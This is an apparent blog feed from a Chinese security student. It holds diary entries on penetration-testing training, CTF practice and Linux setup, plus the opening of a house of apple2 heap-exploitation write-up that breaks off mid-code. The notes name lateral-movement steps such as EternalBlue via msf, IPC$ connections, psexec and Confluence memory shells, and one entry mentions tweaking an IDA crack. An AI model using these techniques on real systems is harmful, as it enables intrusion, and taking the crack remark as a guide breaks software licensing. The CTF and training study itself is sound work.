      <url>/2024/diary/24-8-21/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/ghostyusheng/article/details/80321483">docker-ce解决官网无法连接的问题</a></p><p>docker换源之后记得要<code>systemctl daemon-reload</code> <code>systemctl restart docker.service</code>重启一下docker相关的服务。</p><p>关于ubuntu22美化的资料：</p><p><a href="https://blog.csdn.net/weixin_44348719/article/details/132521680">https://blog.csdn.net/weixin_44348719/article/details/132521680</a></p><p><a href="https://blog.csdn.net/2301_76911706/article/details/133000145">https://blog.csdn.net/2301_76911706/article/details/133000145</a></p><p><a href="https://blog.csdn.net/qq_44928822/article/details/129358224">https://blog.csdn.net/qq_44928822/article/details/129358224</a></p><p><a href="https://blog.51cto.com/zhangxueliang/5376229">https://blog.51cto.com/zhangxueliang/5376229</a></p><p><a href="https://www.gnome-look.org/browse/">https://www.gnome-look.org/browse/</a></p><p><a href="https://www.cnblogs.com/WHU-TD/p/14010786.html">https://www.cnblogs.com/WHU-TD/p/14010786.html</a></p><p>主界面配置得差不多了，很满意。接下来就是自定义terminal了，交给明天的我来处理吧！</p><p>大概给终端加个背景图片就差不多了，还有就是修改一下pwndbg的显示，依然用wsl里用的模板就行，和tmux一起真的是天作之合，可惜还不熟悉tmux的操作，还得多练。</p><p>gnome-tweaks是可以直接在终端输入后打开UI界面的。gnome的那些插件在安装之前一定要在火狐或者chrome上安装拓展。打开这个网站<code>https://extensions.gnome.org</code>之后就会提示你安装插件了。在火狐上安装插件之后，要手动在插件界面允许与本地gnome交互，不然插件是无效的。然后就可以开始安装拓展了。想要调拓展的设置，要在<code>installed extends</code>界面，就有设置可以调了。</p><p>哦对，本地还要安装<code>gnome-chrome-connector</code>这个软件包。22以前的的软件包名字和23开始名字不一样，但是官网有提示。</p><p>全场最佳，那个跟随鼠标的眼睛（</p><p>有时间还是详细写一篇博文记录一下吧。</p><p>shit忽然想起来时钟插件忘了装，一样明天再装好了。<a href="https://blog.csdn.net/2301_76911706/article/details/133000145">教程</a></p><p>如果可以，真的像买台笔记本专门装一个ubuntu来使用。一定很舒服</p>]]></content>
      
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日志 24-8-20</title>
      <link href="/2024/diary/24-8-20/"/>
      <url>/2024/diary/24-8-20/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/zhuminghui/p/16396100.html">bat命令的安装与使用（batcat）</a>支持语法高亮，相当于升级版的cat命令，可以自定义高亮主题。</p><p>linux kernel题目中的cpio文件是一种备份文件，解压流程如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c_lby@laptop:/core$ ls</span><br><span class="line">core.cpio</span><br><span class="line">c_lby@laptop:/core$ mv core.cpio core.cpio.gz</span><br><span class="line">c_lby@laptop:/core$ gunzip core.cpio.gz</span><br><span class="line">c_lby@laptop:/core$ cpio -idm &lt; core.cpio</span><br><span class="line">104379 blocks</span><br></pre></td></tr></table></figure><p>感觉今天唯一学会的就是如何使用宝塔搭建站点，虚拟机里搭建环境的话，一般域名就设置成虚拟机的内网IP就行。记得要设置默认页面。如果是MVC模式的框架，一般就一个像index.php这样的入口文件，就设置一个就行。然后数据库的设置，一定要设置好密码用户名和数据库名，一定要和站点配置对得上，不然会报错。</p>]]></content>
      
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日志 24-8-19</title>
      <link href="/2024/diary/24-8-19/"/>
      <url>/2024/diary/24-8-19/</url>
      
        <content type="html"><![CDATA[<p>Windows内核漏洞挖掘，这下就是真正意义上的还没学会走就要学跑了。不过也学了个大概的思路。如果未来考虑走挖洞这条路，最好是平时多调试多复现一些老的漏洞，积累经验和手感。但是其实国内大多数二进制岗位都是应急响应比较多，像赛博昆仑这样的注重挖洞的公司是很少见的。</p><p><a href="https://xz.aliyun.com/t/6008?time__1311=n4+xnD0DgDc7mqCqGNnmexRm7balgbD#toc-1">cve的解析</a></p><p><a href="https://whereisk0shl.top/post/a-trick-the-story-of-cve-2024-26230">k0shl师傅的博客</a></p><p><a href="https://xiaodaozhi.com/exploit/122.html">https://xiaodaozhi.com/exploit/122.html</a></p><p><a href="https://github.com/leeqwind/HolicPOC/blob/master/windows/win32k/CVE-2015-2546/README.md">https://github.com/leeqwind/HolicPOC/blob/master/windows/win32k/CVE-2015-2546/README.md</a></p><p><a href="https://blog.csdn.net/pangshaohua/article/details/6592390#:~:text=%E8%AE%BE%E7%BD%AE%E6%96%B9%E6%B3%95%EF%BC%9A%20%E2%80%9C%E6%88%91%E7%9A%84%E7%94%B5%E8%84%91%E2%80%9D%E5%B1%9E%E6%80%A7%E4%B8%AD%EF%BC%8C%E9%AB%98%E7%BA%A7%E8%AE%BE%E7%BD%AE%E9%87%8C%EF%BC%8C%20%E6%9C%89%E4%B8%AA%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%EF%BC%8C%20%E5%8F%98%E9%87%8F%E5%90%8D%EF%BC%9A_NT_SYMBOL_PATH,%E5%8F%98%E9%87%8F%E5%80%BC%EF%BC%9ASRV%2A%20%7B%24Path%7D%2Ahttp%3A%2F%2Fmsdl.microsoft.com%2Fdownload%2Fsymbols%2F%20%E5%B0%86%E2%80%9C%20%7B%24Path%7D%E2%80%9D%E6%9B%BF%E6%8D%A2%E4%B8%BA%E8%A6%81%E5%AD%98%E5%82%A8pdb%E7%AC%A6%E5%8F%B7%E8%A1%A8%E6%96%87%E4%BB%B6%E7%9A%84%E8%B7%AF%E5%BE%84%EF%BC%8C%E6%AF%94%E5%A6%82%EF%BC%9AC%3APDB">windbg&#x2F;ida自动下载符号表的设置方法</a></p><p><a href="https://www.anquanke.com/post/id/84911">cve复现</a></p><p><a href="https://github.com/AabyssZG/Docker-TCP-Scan">曾哥的新工具</a></p><p><a href="https://www.4hou.com/posts/n7V5">驱动漏洞挖掘入门</a></p><p>可以说是第一次接触到域渗透，一点经验也没有。菜就多练。</p><p>永恒之蓝的使用是基于139和445端口的开放，且特定漏洞版本下才能使用。使用msf框架可以比较方便地对此进行检测盒利用。kali中使用msfconsole。</p><p>445端口是可以直接在cmd中用<code>net use \\ip\ipc$ password /user:username</code>连接的</p><p>如果有完整权限，可以用psexec工具并接管其cmd。这个工具是微软官方的，也可以用\impacket-examples-windows的。</p><p>linux用多了，Windows的命令不会用一点，平时都是用的gui界面，要多学习Windows命令才行</p><p>要开始学习Windows开发等知识了，不然到时候练PoC都看不懂。</p><p>顺便记录一下今天想到的新生赛出题思路。之前忘记是做什么题了，一道简单的ret2text，然而传参却是往后推了一个的，也就是从rdx开始传。所以可以给一个这样的思路：给一个pop rdx，给一个mov rdi,rdx的gadget，然后组合传参。或者能不能自己写一个简单的so库，so中实现一个自定义的system函数，传两个参数，用其他东西占用一个参数位置，让其他参数顺延（也可以用execve）。</p><p>另一个出题想法是给<code>pop r8``call r8</code>这样的gadget，配合固定地址的mmap写shellcode，但是要自己利用栈溢出来执行shellcode。诶等等但是这样岂不是可以把地址写到ret位置上？可以给传入的参数加上字符过滤就好了。比如0x114514这样的地址，一般来说是不合法的，那么就可以在检查字符串的时候提示，地址非法。检查的话，为了防止加偏移绕过，可以用白名单的方式，比如检查是否来自程序基址段或者libc地址段上。</p>]]></content>
      
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日志 24-8-18</title>
      <link href="/2024/diary/24-8-18/"/>
      <url>/2024/diary/24-8-18/</url>
      
        <content type="html"><![CDATA[<p>今天学的内容，是路由器固件漏洞挖掘和杀软漏洞挖掘。没有讲到环境模拟和固件提取，专注于讲漏洞挖掘。学到很多东西。捋一下</p><ul><li>实战中，IDA逆向分析的入手点一般是字符串。像路由器和杀软这样的二进制程序，会产生大量的日志，写这些日志就会有很多字符串留存在程序当中，而且其实一般不会像CTF一样各种隐藏。所以可以把具体位置的日志信息当做注释来看，辅助分析。</li><li>有些攻击面，有些漏洞，其实要结合web的知识，尤其是逻辑漏洞。比如没有过滤字符导致的目录穿越、sql注入等等。不要只带着二进制漏洞的思想去看iot中的漏挖</li><li>一般路由器（包括其他IOT设备）最好是挖未授权，授权后的漏洞一般利用条件比较难。</li><li>不要和别人挤破头都去找大热门被挖烂了的攻击面，找些冷门的。</li><li>不要放过任何一个小洞，可能可以和其他洞组合成一个大洞。</li><li>有些路由器是可以ssh上去的（比如华硕）</li></ul><p>初次体验了一下fuzz，用winafl，虽然最后因为环境配置问题（主要还是那个RIO），没跑成功。RIO如果要在本地编译需要安装perl，现在安装这玩意真是鬼死麻烦，已下载安装包，<strong>未配置，有时间再跑一下</strong>。讲讲收获：</p><ul><li>如何在cpp中静、动态调用dll，封装想要调试的函数（或流程）。</li><li>fuzz一个封装了想要测试的接口的程序，比测试原本的程序更快更方便。</li><li>winafl的参数设置，<strong>后面专门写一篇博客分析一下</strong>，还有写多开主次线程的批处理文件方法。</li><li>对于二进制插桩有了更深一层的理解，但是感觉还远远不够。</li><li><a href="https://libuv-docs-chinese.readthedocs.io/zh/latest/api.html">libuv库</a></li></ul><p>同学来问关于wsl代理的问题，我也是该<strong>找时间研究一下</strong>了，自己使用起来也是有点麻烦的，包括git终端也是不走代理，很难受。关于<a href="https://blog.dejavu.moe/posts/cfw-tun/">tun</a>和<a href="https://clashforwindows.cc/tun-%E6%A8%A1%E5%BC%8F/">tun</a>。</p><p>VM的vmdk磁盘文件可以通过ovf加载整台虚拟机，如果遇到hash对不上的情况，删掉打包的时候带有的mf文件即可。</p>]]></content>
      
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日志 24-8-17</title>
      <link href="/2024/diary/24-8-17/"/>
      <url>/2024/diary/24-8-17/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.yuque.com/hxfqg9">yichen师傅的知识库</a>，有IoT，硬件安全，智能合约，web等.</p><p>劳累的一天。今天学内网渗透，虽然因为不怎么感兴趣而听得很潦草（？），但是依然学到了很多东西。不得不承认，这个地方真的能学到东西，老师真的会告诉你要怎么实操，要找什么东西要怎么找。这两三天来大量高深知识涌入脑子，能不能吸收另当别论，至少确确实实是有用且能用的知识与技能。</p><p>大部分知识也都记在笔记里了，重要的是晚上的靶场模拟演练切切实实感受了一遍内网渗透，或者说后渗透的大致流程和一些操作技巧等等。但是因为没什么经验，所以打得很菜，实际能找到的flag只有两个……虽然跟着思路现学新工具和知识复现打出了4个flag，依然有一个没能找到。</p><p>学到的新知识或资源有</p><ul><li><a href="https://www.anquanke.com/post/id/225870">内存马</a></li><li>冰蝎的使用（很强大，可以扫描网络资产存活的主机和运行的服务，搭建隧道实现内网穿透等等）</li><li>cve-2021-26084（<a href="https://www.cnblogs.com/NoId/p/16573825.html">confluence</a>的一个rce）</li><li>PostgreSQL数据库（可以用navicat连接，也可以用linux下的psql工具）</li><li>开源工具ConfluenceMemshell，可以一键给confluence注入内存马（有漏洞的情况下）</li><li><a href="https://blog.csdn.net/qq_39583774/article/details/130947754">双重内网横穿</a>，其实今天的靶场中最后一步也有这个场景，但是没做出来，有待复现</li><li><a href="https://tq.jxsec.cn/cas/index">天穹靶场</a></li><li><a href="https://www.somd5.com/">somd5</a></li></ul><p>哦对，顺便把kernel basic和ret2usr学了，虽然还没自己复现，有时间再说吧。大概思路是明白了，果然，之前没看懂的的知识，过一段时间再看就能看懂了，虽然最本初的原理还没去研究，但是流程和做法大致理解了。</p><p>顺带一提，还要找时间看看IDA9的破解原理，看能不能把名字改一下。其实研究那个py脚本文件就好了吧我想。看了一眼，果不其然，试试能不能改生效。大功告成！</p>]]></content>
      
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日志 24-8-16</title>
      <link href="/2024/diary/24-8-16/"/>
      <url>/2024/diary/24-8-16/</url>
      
        <content type="html"><![CDATA[<p>其实现在是17号凌晨，不过有接触到新的东西所以还是记录一下。首先是今天培训讲的内容有关Windows免杀，还算是比较感兴趣。但是苦于基础知识不多，开发能力欠缺，学起来和实践起来还是有点痛苦的。如果以后要走免杀研究或者杀软对抗这条路的话，至少要学好cpp、go、rust之类的语言，同时还要学Windows api相关的东西。</p><p>第二是做了一道背包加密的题目，用LLL算法在sage进行解密，这部分知识有待进一步深入学习。<a href="https://blog.csdn.net/XiongSiqi_blog/article/details/132109655">资料</a></p><p>第三是，很久没用过web伪协议的知识了，应该要回顾一下了。</p><p>第四是，我觉得可能当下比较重要的一点，应该要开始接触一点点linux kernel的内容了。<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x00-%E7%BB%AA%E8%AE%BA">资料是a3师傅的博客</a></p>]]></content>
      
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日志 24-8-14</title>
      <link href="/2024/diary/24-8-14/"/>
      <url>/2024/diary/24-8-14/</url>
      
        <content type="html"><![CDATA[<p>今天似乎什么也没学，来青马红客训练营这边报了个道，也是来到锦行科技的公司了。</p><p>VN的成员页做好了，因为头像托管在github上加载有点慢，所以汪队帮我传到oss上了<a href="https://vnteam.cn/members/%E3%80%82oss%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E9%98%BF%E9%87%8C%E4%BA%91%E7%9A%84%E5%AF%B9%E8%B1%A1%E5%82%A8%E5%AD%98%E6%9C%8D%E5%8A%A1%E3%80%82%E6%9C%89%E6%97%B6%E9%97%B4%E4%BA%86%E8%A7%A3%E4%B8%80%E4%B8%8B%E3%80%82">https://vnteam.cn/members/。oss是什么？阿里云的对象储存服务。有时间了解一下。</a></p>]]></content>
      
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日志 24-8-13</title>
      <link href="/2024/diary/24-8-13/"/>
      <url>/2024/diary/24-8-13/</url>
      
        <content type="html"><![CDATA[<p>ak了moe的web，太久没做ctf的web题，有点手生了。很艰难地学习并大概理解了pop链要怎么做，感谢jjg的帮助。<a href="https://blog.csdn.net/qq_45927266/article/details/120380343">资料</a>。之前是一点都看不懂，现在感觉能理解什么意思了，也知道要怎么生成payload了。最好还是全面学习一下php比较好，pwn题也会用得到。</p><p>晚上忽然上新一道运维题，抢救一个误删了glibc的linux系统，每次环境只有一次机会，因为仅存一个shell，如果断连了就没有了。也是第一次知道ls、cp这些命令是依赖于glibc的。找到了<a href="https://tech.soraharu.com/archives/96/">资料</a>，之前一直看到busybox，但没有真正去了解他，现在大概知道是个什么东西了。在我看来就是适合塞进嵌入式的小体积静态编译二进制程序包，可以实现linux的命令之类的功能，很方便。之后有时间也要深入了解一下。</p><p>感觉自己linux学得也是半斤八两，还是系统学习一下运维知识比较好。</p>]]></content>
      
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日志 24-8-12</title>
      <link href="/2024/diary/24-8-12/"/>
      <url>/2024/diary/24-8-12/</url>
      
        <content type="html"><![CDATA[<p>可算是把页面处理好了，但是页面读取文章只能从全部文章列表里筛选符合diary分类的文章出来显示。换句话来说，他会作为一篇post出现在其他页面，虽然可以用隐藏，但是写frontmatter比较麻烦，得想个办法才行。</p><p>换了个生成器，可以限定某个页面只显示特定tag的文章，完美解决。还有一点麻烦的是每次新建文章，都要手动整理文章到路径。如果用-p参数，则没法自动抓取front-matter模板，今日乏了，不改源码了。我记得好像有现成的插件可以自动分类文件夹的，明天在找找。</p>]]></content>
      
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日志 24-8-11</title>
      <link href="/2024/diary/24-8-11/"/>
      <url>/2024/diary/24-8-11/</url>
      
        <content type="html"><![CDATA[<p>把moe的密码和misc也做了，ak了第一周密码。misc依然是脑洞不是很够。</p><p>开始捣鼓diary页面了。在写时尚小垃圾的时候发现，归档页面的title是中文，而其他页面title是英文，强迫症受不了，于是翻了一下几个ejs，改了改其他页面引用title的方式是从语言yml文件里来的就行了。</p><p>好像归档的界面就是最理想的对于日记排版的界面，有年月日和标题，打算就用这个了，改改里面储存文档的路径就好了，希望今晚能搞定。（21:31）</p><p>看来是搞不定，官方文档已经是新版本的变量了，旧版本只能靠自己摸索摸索了。现在要想办法在diary界面过滤tag，使得显示出来的文章只有diary的。</p>]]></content>
      
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日志 24-8-10</title>
      <link href="/2024/diary/24-8-10/"/>
      <url>/2024/diary/24-8-10/</url>
      
        <content type="html"><![CDATA[<p>前几天受到某个大佬的启发，想要在博客里加个日记的页面，每天记录一点当日搞的小玩意或者学到的东西，这样无论是记录当天学习内容还是为了第二天衔接没做完当天没做完的工作，都很方便。</p><p>事不宜迟，那么今天就开始升级博客了。首先是加装了页面加密和隐藏的插件，<a href="https://blog.yxyang.top/posts/24498.html">资料</a>。想在menu上加一个diary的页面，但是还没想好该怎么呈现内容，估计还得手搓一下ejs，所以页面这一块暂且搁置了。</p><p>把2024moectf的pwn第一周的题目做完了，题目依然是很有moe的味道，但是没有那么传统了，不如说新颖得有点不适应，虽然很简单，但是最后一题的引导性没那么好。misc的引导性就比较强。当然也有可能是我比较菜。</p><p>wsrx桌面版太麻烦，用习惯了linux，所以直接装了命令行的版本。这玩意是用rust写的，要求版本在1.77以上，所以还得rustup升级，结果下载安装好几遍都更换版本不成功，索性删掉重新安装。<a href="https://www.sysgeek.cn/ubuntu-install-rust/#google_vignette">资料</a>。到最后发现最重要的是要激活环境这一步source $HOME&#x2F;.cargo&#x2F;env，然而其他资料都没有写到。顺带一提，旧版本的rustup没有自删除的功能……用上命令行版本的wsrx就顺手多了，虽然还是很想吐槽，这四个字母在键盘上真的不好打……</p>]]></content>
      
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『Heap Exploitation』对house of apple2的理解与分析</title>
      <link href="/2024/house-of-apple2/"/>
      <url>/2024/house-of-apple2/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>之前傻乎乎的在网上找资料学习的时候学得一头雾水，最近才忽然想到为什么不去<a href="https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2">roderick师傅的博客</a>直接看本人的分析呢。然后发现roderick师傅写的是最详细最易懂的，推荐正在学习apple2的师傅直接去看。</p><p>我这里据两道题来分析，记录一下学习的过程。</p><h3 id="0x01-知识点分析『DeadSec-CTF-2024』shadow"><a href="#0x01-知识点分析『DeadSec-CTF-2024』shadow" class="headerlink" title="0x01  知识点分析『DeadSec CTF 2024』shadow"></a>0x01  知识点分析『DeadSec CTF 2024』shadow</h3><p>略过泄露堆地址和libc地址的过程，详情看<a href="https://c-lby.top/2024/07/30/2024-deadsec-wp/">这篇文章</a>。这里直接关注利用house of apple2来getshell的部分。</p><h4 id="基础知识回顾"><a href="#基础知识回顾" class="headerlink" title="基础知识回顾"></a>基础知识回顾</h4><p>apple系列手法主要是劫持FILE结构中的<code>_wide_data</code>成员中的<code>_wide_vtable</code>中的某个函数指针为ogg或者system。要劫持哪个函数取决于选择的调用链。如果忘记或者不清楚的，建议先看原博客文章，再来看这里的具体分析。</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>menu显示用的是puts函数（也可能是printf打印了出字符串加换行结尾，这种情况编译器也会将printf优化成puts函数），我们考虑劫持puts函数的输出流来打apple2。</p><h5 id="puts函数正常执行流程"><a href="#puts函数正常执行流程" class="headerlink" title="puts函数正常执行流程"></a>puts函数正常执行流程</h5><p>我们先关注一下puts函数正常执行流程是怎么样的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_puts (<span class="type">const</span> <span class="type">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = EOF;</span><br><span class="line">  <span class="type">size_t</span> len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (<span class="built_in">stdout</span>) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (<span class="built_in">stdout</span>, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (<span class="built_in">stdout</span>, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">&#x27;\n&#x27;</span>, <span class="built_in">stdout</span>) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  _IO_release_lock (<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)</span></span><br></pre></td></tr></table></figure><p>puts函数会通过宏调用到<code>_IO_XSPUTN</code>函数，随后又会通过根据偏移在vtable跳转到对应函数去执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSPUTN(FP, DATA, N) JUMP2 (__xsputn, FP, DATA, N)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);    &lt;--原本要解析的</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);  &lt;--我们想要解析的（准确来说是wide_vtable对应的那个seekoff，往下阅读）</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果按照roderick师傅给出的三个调用链，那么我们需要让puts函数调用到<code>__overflow</code>或者<code>__doallocate</code>两个位置上。这里我选用了另一条调用链，需要从<code>__seekoff</code>作为入口。</p><h5 id="劫持vtable指针"><a href="#劫持vtable指针" class="headerlink" title="劫持vtable指针"></a>劫持vtable指针</h5><p>正常执行puts函数的话肯定不会达到<code>__seekoff</code>，所以我们要修改vtable指针为正常虚表地址加上0x10的偏移，让puts函数从xsputn解析到seekoff。因为只是加个偏移，虚表依然位于libc的虚表段中，不会触发检查报错。当然，这里虚表需要我们写入的是<code>_IO_wfile_jumps+0x10</code>，因为要调用到<code>_wide_data</code>成员相关的函数。这里是我们要修改的第一个地方。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span>   &lt;---要改成_IO_wfile_jumps+<span class="number">0x10</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="劫持-wide-data"><a href="#劫持-wide-data" class="headerlink" title="劫持_wide_data"></a>劫持_wide_data</h5><p>下面是第二个要修改的地方，file结构体中的<code>_wide_data</code>指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">      </span><br><span class="line">  <span class="type">__off64_t</span> _offset;</span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span>   &lt;---要修改的指针</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们需要将他修改为一个可控的地址，用来伪造虚表。我们来看一下这个结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> 